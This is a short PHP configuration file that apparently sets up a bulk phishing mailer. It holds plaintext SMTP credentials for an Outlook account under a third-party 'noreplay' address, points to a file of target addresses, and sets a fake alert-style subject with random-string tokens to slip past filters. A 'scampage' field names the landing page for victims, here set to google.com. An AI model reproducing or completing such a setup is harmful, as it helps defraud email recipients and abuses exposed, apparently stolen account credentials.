<?php
// xampp
//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp.outlook.com",
        "port"     => "587",
        "username" => "noreplay@thestartrak.co.uk",
        "password" => "Dox77714",
    ],


];

/* Features SETUP */

$gx_setup = [
    "priority"       => 0,
    "userandom"      => 0,
    "sleeptime"      => 10,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/randymix.txt",
    "fromname"       => "lolz",
    "frommail"       => "noreplay@thestartrak.co.uk",
    "subject"        => "RE : [ Alert ] [ Summary News Report ] Confirmation  [ FEB 2019 ] ##randstring## FWD.",
    "msgfile"        => "file/letter/letter.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://google.com"],
];
